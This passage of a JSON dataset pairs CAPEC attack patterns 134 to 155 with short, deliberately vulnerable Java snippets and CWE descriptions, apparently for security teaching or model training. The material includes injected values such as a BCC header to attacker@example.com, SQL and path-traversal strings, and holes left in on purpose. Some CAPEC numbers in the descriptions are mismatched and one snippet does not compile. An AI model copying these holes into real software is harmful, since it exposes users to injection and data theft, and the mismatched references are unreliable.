        "description": "This Java code snippet represents an application that processes command-line arguments to enable various modes, including a hidden functionality mode. The main idea of the CAPEC 'Try All Common Switches' is embodied by the indiscriminate invocation of command-line options to discover weaknesses. The code includes a hidden functionality option ('--hidden') that is not documented or intended for public use, representing CWE-912 (Hidden Functionality). The debug mode ('--debug') can reveal sensitive information, and the verbose mode ('--verbose') increases logging verbosity. The code does not handle errors or unexpected inputs robustly, which can lead to CWE-184 (Incomplete List of Disallowed Inputs) and CWE-391 (Unchecked Error Condition)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailInjectionExample {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String subject = \"Hello\";\n        String body = \"This is a test email.\";\n        String maliciousInput = \"\\nBCC: attacker@example.com\";\n\n        sendEmail(to, subject, body + maliciousInput);\n    }\n\n    public static void sendEmail(String to, String subject, String body) {\n        String from = \"sender@example.com\";\n        String host = \"localhost\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(subject);\n            message.setText(body);\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an email injection vulnerability. The `maliciousInput` string contains a newline character followed by a BCC header, which is appended to the email body. When the email is sent, the malicious input manipulates the email headers, adding a BCC recipient without the sender's intention. This example embodies the CAPEC of Email Injection by showing how delimiter characters (newline) can be used to manipulate email headers. The related CWEs are represented by the improper neutralization of special elements (CWE-150, CWE-147) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class FormatStringVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String userInput = scanner.nextLine();\n        // Vulnerable code: using user input directly in format string\n        System.out.printf(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability. The program prompts the user to enter their name and then uses the user-provided input directly in a printf statement. This is dangerous because if the user input contains format specifiers (e.g., %s, %n), it can lead to unexpected behavior, such as reading or writing to memory locations. This vulnerability arises from the use of an externally-controlled format string (CWE-134) without proper input validation (CWE-20, CWE-1286) or neutralization of special elements (CWE-74). The code does not restrict the use of dynamically-identified variables (CWE-914), making it susceptible to exploitation."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport java.util.Hashtable;\n\npublic class LDAPInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"(uid=*\")\"; // Simulated user input\n        String ldapSearchBase = \"ou=users,dc=example,dc=com\";\n        String ldapSearchFilter = \"(uid=\" + userInput + \")\";\n\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldap://localhost:389\");\n\n        try {\n            DirContext ctx = new InitialDirContext(env);\n            SearchControls searchControls = new SearchControls();\n            searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n\n            // Vulnerable LDAP query\n            NamingEnumeration<SearchResult> results = ctx.search(ldapSearchBase, ldapSearchFilter, searchControls);\n\n            while (results.hasMore()) {\n                SearchResult searchResult = results.next();\n                System.out.println(\"Found entry: \" + searchResult.getNameInNamespace());\n            }\n        } catch (NamingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The user input is directly concatenated into the LDAP search filter without proper validation or neutralization of special characters. This allows an attacker to manipulate the LDAP query by injecting special characters or commands. In this example, the user input is set to '(uid=*)', which could potentially return all user entries in the LDAP directory. This code embodies the main idea of CAPEC-90 (LDAP Injection) and highlights related weaknesses such as improper neutralization of special elements (CWE-90) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String query = \"SELECT * FROM users WHERE username='\" + userInput + \"'\";\n        // Simulate query execution\n        System.out.println(\"Executing query: \" + query);\n        response.getWriter().write(\"Query executed: \" + query);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to parameter injection, as described in the CAPEC. The servlet takes a user input from an HTTP GET request parameter named 'input' and directly incorporates it into an SQL query string without proper validation or encoding. This can allow an attacker to manipulate the query by injecting special characters or additional parameters. For example, if the user input is 'admin' or '1'='1', the resulting query would be 'SELECT * FROM users WHERE username='admin' or '1'='1'', which could lead to SQL injection. This snippet also touches on related CWEs, such as improper neutralization of special elements (CWE-77) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class ReflectionInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java ReflectionInjectionExample <className> <methodName>\");\n            return;\n        }\n\n        String className = args[0];\n        String methodName = args[1];\n\n        try {\n            // Load the class specified by the user\n            Class<?> cls = Class.forName(className);\n\n            // Get the method specified by the user\n            Method method = cls.getMethod(methodName);\n\n            // Invoke the method\n            method.invoke(cls.newInstance());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a reflection injection vulnerability. The program takes two command-line arguments: the name of a class and the name of a method. It then uses Java's reflection API to load the specified class and invoke the specified method. This code is vulnerable because it does not validate or sanitize the user input, allowing an attacker to potentially load malicious classes or invoke unintended methods. This can lead to various security issues such as unauthorized access, code execution, or data leakage. The code embodies the main idea of CAPEC-470 (Unsafe Reflection) and is related to other CWEs like Command Injection (CWE-77) and Code Injection (CWE-94)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a relative path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to supply a path like '../../etc/passwd' to access sensitive files outside the intended directory. This embodies the main idea of CAPEC-126 (Relative Path Traversal) and related CWEs, where improper input validation allows traversal to unintended directories."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class MultiFormServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String currentForm = request.getParameter(\"form\");\n        HttpSession session = request.getSession();\n        String expectedForm = (String) session.getAttribute(\"expectedForm\");\n\n        if (expectedForm == null || !expectedForm.equals(currentForm)) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid form sequence\");\n            return;\n        }\n\n        // Process the form data\n        // ...\n\n        // Update the expected form for the next step\n        session.setAttribute(\"expectedForm\", getNextForm(currentForm));\n    }\n\n    private String getNextForm(String currentForm) {\n        switch (currentForm) {\n            case \"form1\": return \"form2\";\n            case \"form2\": return \"form3\";\n            case \"form3\": return \"form4\";\n            default: return null;\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a multi-form web application where users are required to submit information through an ordered sequence of forms. The servlet checks if the current form being submitted matches the expected form stored in the session. If the forms are out of sequence, an error is returned. This prevents attackers from bypassing intermediate forms by directly navigating to later forms. The code addresses CWE-372 (Incomplete Internal State Distinction) by ensuring the application correctly tracks the form sequence state, CWE-472 (External Control of Assumed-Immutable Web Parameter) by validating the form parameter, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by not relying solely on the form parameter without session validation."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CachePoisoningExample {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate fetching data from a less trusted source\n        String data = fetchDataFromUntrustedSource(\"key1\");\n        cache.put(\"key1\", data);\n\n        // Simulate fetching data from a trusted source\n        String trustedData = fetchDataFromTrustedSource(\"key1\");\n        cache.put(\"key1\", trustedData);\n\n        // Accessing the cache\n        String cachedData = cache.get(\"key1\");\n        System.out.println(\"Cached Data: \" + cachedData);\n    }\n\n    private static String fetchDataFromUntrustedSource(String key) {\n        // Simulate untrusted data\n        return \"untrusted_data\";\n    }\n\n    private static String fetchDataFromTrustedSource(String key) {\n        // Simulate trusted data\n        return \"trusted_data\";\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache poisoning scenario. The cache is a HashMap that stores key-value pairs. The `fetchDataFromUntrustedSource` method simulates fetching data from a less trusted source (CWE-348), while the `fetchDataFromTrustedSource` method simulates fetching data from a trusted source. The cache is first populated with untrusted data and then with trusted data. However, due to the lack of proper verification (CWE-345, CWE-346), the cache can be poisoned with untrusted data. This example highlights the risk of accepting and storing untrusted data in a cache, which can lead to incorrect or harmful data being treated as valid until the cache is refreshed."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSCachePoisoningExample {\n    private static Map<String, String> dnsCache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding a trusted DNS entry\n        dnsCache.put(\"www.example.com\", \"93.184.216.34\");\n\n        // Simulate an attacker poisoning the DNS cache\n        dnsCache.put(\"www.example.com\", \"192.168.1.100\");\n\n        // Client trying to resolve the domain name\n        String ipAddress = resolveDomain(\"www.example.com\");\n        System.out.println(\"Resolved IP Address: \" + ipAddress);\n    }\n\n    public static String resolveDomain(String domain) {\n        // Check the local DNS cache first\n        if (dnsCache.containsKey(domain)) {\n            return dnsCache.get(domain);\n        }\n\n        // Fallback to actual DNS resolution\n        try {\n            InetAddress inetAddress = InetAddress.getByName(domain);\n            return inetAddress.getHostAddress();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DNS cache poisoning. The `dnsCache` map simulates a local DNS cache. Initially, a trusted DNS entry is added to the cache. Then, an attacker poisons the cache by inserting a malicious IP address for the same domain. When the client tries to resolve the domain name, it retrieves the poisoned IP address from the cache instead of performing a proper DNS resolution. This example embodies the main idea of DNS Cache Poisoning (CAPEC-139) and highlights related weaknesses such as 'Use of Less Trusted Source' (CWE-348), 'Insufficient Verification of Data Authenticity' (CWE-345), and 'Origin Validation Error' (CWE-346)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class SensitiveFileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = getServletContext().getRealPath(\"/sensitive-data/config.txt\");\n        File file = new File(filePath);\n        if (file.exists()) {\n            response.setContentType(\"text/plain\");\n            try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where sensitive data is stored under the web root and can be accessed without proper authorization. The servlet serves a file located at '/sensitive-data/config.txt' directly to the client if it exists. This embodies the CAPEC idea of 'Detect Unpublicized Web Pages' by allowing an adversary to access sensitive information that was not intended to be publicized. The code also touches on related CWEs such as CWE-219 (Storage of File with Sensitive Data Under Web Root) and CWE-425 (Direct Request ('Forced Browsing'))."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/hiddenService\")\npublic class HiddenService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No authentication or authorization checks\n        response.getWriter().println(\"This is a hidden service\");\n    }\n}\n\n// Exposing WSDL file\n@WebServlet(\"/wsdl\")\npublic class WSDLService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.getWriter().println(\"<wsdl:definitions>...</wsdl:definitions>\");\n    }\n}\n\n// Downloading code without integrity check\n@WebServlet(\"/download\")\npublic class DownloadService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No integrity check\n        response.getWriter().println(\"Downloading code...\");\n    }\n}\n\n// Exposing version-control repository\n@WebServlet(\"/repo\")\npublic class RepoService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.getWriter().println(\"Repository contents...\");\n    }\n}\n\n// Omitting security-relevant information\n@WebServlet(\"/log\")\npublic class LogService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No logging of security-relevant information\n        response.getWriter().println(\"Logging service\");\n    }\n}",
        "description": "This Java code snippet demonstrates a web application with multiple vulnerabilities as described in the CAPEC and related CWEs. The 'HiddenService' servlet represents an unpublicized web service that lacks authentication and authorization checks (CWE-425). The 'WSDLService' servlet exposes a WSDL file containing sensitive information (CWE-651). The 'DownloadService' servlet downloads code without performing an integrity check (CWE-494). The 'RepoService' servlet exposes a version-control repository to unauthorized users (CWE-527). Finally, the 'LogService' servlet omits logging of security-relevant information (CWE-223). This code illustrates how an adversary could exploit these weaknesses to detect and misuse unpublicized web services."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class ChecksumSpoofingExample {\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String message = \"Sensitive data\";\n        String checksum = generateChecksum(message);\n\n        // Simulate message modification by an adversary\n        String tamperedMessage = \"Tampered data\";\n        String tamperedChecksum = generateChecksum(tamperedMessage);\n\n        // Vulnerable validation: only checks if the checksum matches\n        if (validateChecksum(tamperedMessage, tamperedChecksum)) {\n            System.out.println(\"Message is valid.\");\n        } else {\n            System.out.println(\"Message has been tampered with.\");\n        }\n    }\n\n    public static String generateChecksum(String message) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] digest = md.digest(message.getBytes());\n        return Arrays.toString(digest);\n    }\n\n    public static boolean validateChecksum(String message, String checksum) throws NoSuchAlgorithmException {\n        String newChecksum = generateChecksum(message);\n        return newChecksum.equals(checksum); // CWE-354: Improper Validation of Integrity Check Value\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of checksum validation, embodying the concept of Checksum Spoofing (CAPEC-37). The code uses a weak hash function (MD5) to generate checksums (CWE-328). An adversary can modify the message and generate a new checksum for the tampered message. The validation function only checks if the checksum matches, without ensuring the integrity of the original message (CWE-354). This allows the tampered message to be accepted as valid, illustrating the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Validator;\nimport org.w3c.dom.Document;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\n\npublic class XMLSchemaPoisoningExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File xmlFile = new File(\"data.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(xmlFile);\n            doc.getDocumentElement().normalize();\n\n            // Load external schema file (potentially poisoned)\n            File schemaFile = new File(\"schema.xsd\");\n            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n            Schema schema = schemaFactory.newSchema(schemaFile);\n\n            // Validate XML against the schema\n            Validator validator = schema.newValidator();\n            validator.validate(new DOMSource(doc));\n\n            System.out.println(\"XML is valid against the schema.\");\n        } catch (SAXException | IOException | ParserConfigurationException e) {\n            System.out.println(\"XML is not valid: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an XML file is validated against an external XML schema. The code loads an XML file and an external schema file, then validates the XML against the schema. This setup is vulnerable to XML Schema Poisoning (CAPEC-170) because the schema file is loaded from an external source, which could be controlled by an attacker. If the schema is poisoned, it could undermine the security of the application processing the XML. The code also touches on related CWEs: CWE-15 (External Control of System or Configuration Setting) by allowing external control over the schema file, CWE-472 (External Control of Assumed-Immutable Web Parameter) by assuming the schema file is immutable, and CWE-112 (Missing XML Validation) by not ensuring the schema itself is trusted."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.soap.MessageFactory;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.soap.SOAPMessage;\nimport javax.xml.transform.stream.StreamSource;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class XMLPingOfDeath {\n    public static void main(String[] args) throws SOAPException, ParserConfigurationException, SAXException, IOException {\n        String xmlPayload = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://www.example.org/webservice\\\"><soapenv:Header/><soapenv:Body><web:ping/></soapenv:Body></soapenv:Envelope>\";\n        for (int i = 0; i < 1000000; i++) { // Simulate rapid sending of XML messages\n            sendSOAPMessage(xmlPayload);\n        }\n    }\n\n    private static void sendSOAPMessage(String xmlPayload) throws SOAPException, ParserConfigurationException, SAXException, IOException {\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage soapMessage = messageFactory.createMessage(null, new StreamSource(new StringReader(xmlPayload)));\n        // Simulate processing of the SOAP message\n        processSOAPMessage(soapMessage);\n    }\n\n    private static void processSOAPMessage(SOAPMessage soapMessage) throws ParserConfigurationException, SAXException, IOException {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document document = builder.parse(new InputSource(new StringReader(soapMessage.getSOAPBody().getTextContent())));\n        // Simulate resource-intensive processing\n        System.out.println(\"Processed message: \" + document.getDocumentElement().getTagName());\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an XML Ping of the Death attack. The main idea is to simulate a resource depletion attack by rapidly sending a large number of small XML messages (SOAP messages in this case) to a target. The `main` method generates a large number of SOAP messages and sends them to the `sendSOAPMessage` method, which processes each message. The `processSOAPMessage` method simulates resource-intensive processing of the SOAP message. This code embodies the CAPEC by demonstrating how repetitive SOAP transactions can deplete resources faster than a simple flooding attack. The related CWEs are represented by the lack of resource control (CWE-400), absence of limits or throttling (CWE-770), and missing XML validation (CWE-112)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            String url = \"http://example.com/data\";\n            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Simulate content spoofing by modifying the content\n            String spoofedContent = content.toString().replace(\"Original Content\", \"Spoofed Content\");\n\n            // Display the spoofed content\n            System.out.println(\"Received Content: \" + spoofedContent);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing. The program fetches data from a URL (http://example.com/data) and reads the content. It then simulates content spoofing by replacing 'Original Content' with 'Spoofed Content' in the fetched data. Finally, it prints the spoofed content. This example embodies the main idea of CAPEC-139 (Content Spoofing) by showing how an adversary could modify the content received from a web server. The code also touches on related CWEs, such as CWE-345 (Insufficient Verification of Data Authenticity) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), by not verifying the authenticity or integrity of the received data."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.util.HashSet;\nimport java.util.Set;\n\npublic class InsecureTempFileExample {\n    public static void main(String[] args) {\n        try {\n            // Predictable temporary file name\n            String tempFileName = \"tempfile_\" + System.currentTimeMillis() + \".txt\";\n            File tempFile = new File(\"/tmp/\" + tempFileName);\n\n            // Create the temporary file\n            if (tempFile.createNewFile()) {\n                System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n\n                // Set insecure permissions (world-readable and writable)\n                Set<PosixFilePermission> perms = new HashSet<>();\n                perms.add(PosixFilePermission.OWNER_READ);\n                perms.add(PosixFilePermission.OWNER_WRITE);\n                perms.add(PosixFilePermission.GROUP_READ);\n                perms.add(PosixFilePermission.GROUP_WRITE);\n                perms.add(PosixFilePermission.OTHERS_READ);\n                perms.add(PosixFilePermission.OTHERS_WRITE);\n                Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n                System.out.println(\"Insecure permissions set on temporary file.\");\n            } else {\n                System.out.println(\"Failed to create temporary file.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of a temporary file with a predictable name in a common temporary directory ('/tmp/'). The file is created with insecure permissions, making it world-readable and writable. This embodies the main idea of the CAPEC 'Explore for Predictable Temporary File Names' by showing how an attacker could predict the file name and location, and then exploit the insecure permissions to access or manipulate the file. The code also highlights related CWEs such as CWE-377 (Insecure Temporary File), CWE-378 (Creation of Temporary File With Insecure Permissions), and CWE-379 (Creation of Temporary File in Directory with Insecure Permissions)."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // Example of a common resource location\n        String configFilePath = \"/etc/config.txt\";\n        File configFile = new File(configFilePath);\n\n        if (configFile.exists() && configFile.canRead()) {\n            try (FileInputStream fis = new FileInputStream(configFile)) {\n                byte[] data = new byte[(int) configFile.length()];\n                fis.read(data);\n                String configContent = new String(data, \"UTF-8\");\n                System.out.println(\"Config Content: \" + configContent);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Config file is not accessible.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' (CAPEC-168). The code attempts to read a configuration file located at a well-known path ('/etc/config.txt') on a Unix system. If the file exists and is readable, it reads the file's content and prints it to the console. This example highlights the vulnerability where sensitive information stored in common resource locations can be accessed by unauthorized actors if proper access controls are not enforced. The related CWEs provide additional context, such as the risk of making files accessible to external parties (CWE-552) and the importance of properly managing sensitive data (CWE-1323)."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IdentitySpoofingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Pre-populated user database with username and password\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // Improper Authentication: No verification of the identity\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(password);\n    }\n\n    public static void main(String[] args) {\n        // Simulating an identity spoofing attack\n        String spoofedUsername = \"user1\";\n        String spoofedPassword = \"password1\";\n\n        if (authenticate(spoofedUsername, spoofedPassword)) {\n            System.out.println(\"Authentication successful for user: \" + spoofedUsername);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + spoofedUsername);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to identity spoofing. The `authenticate` method checks if the provided username exists in the `userDatabase` and if the corresponding password matches. However, this method does not sufficiently prove the identity of the user, making it susceptible to identity spoofing attacks. An attacker with knowledge of valid username-password pairs can easily spoof the identity of legitimate users. This example embodies the main idea of CAPEC-151 (Identity Spoofing) and highlights related CWEs such as CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication)."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InputValidationExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your age: \");\n        String input = scanner.nextLine();\n        int age = Integer.parseInt(input); // CWE-1287: Improper Validation of Specified Type of Input\n        if (age >= 18) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a common vulnerability related to improper input validation (CAPEC-20). The program prompts the user to enter their age and then attempts to parse the input directly to an integer without validating if the input is indeed a valid integer (CWE-1287). This can lead to a NumberFormatException if the input is not a valid integer, potentially causing the program to crash or behave unexpectedly. Additionally, the code makes a security decision based on this untrusted input (CWE-807), which can be manipulated by an attacker to bypass the access control mechanism."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ResourceLocationSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            String urlString = \"http://trusted-site.com/resource\";\n            URL url = new URL(urlString);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No verification of the actual endpoint\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer content = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            conn.disconnect();\n\n            System.out.println(\"Resource content: \" + content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential Resource Location Spoofing vulnerability. The code attempts to fetch a resource from a specified URL without verifying the actual endpoint. This can be exploited by an attacker to redirect the request to a malicious resource. The code embodies CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not ensuring the URL is correct and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not verifying the endpoint. This lack of verification can lead to the application fetching resources from unintended or malicious locations, representing the main idea of CAPEC-111 (Resource Location Spoofing)."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
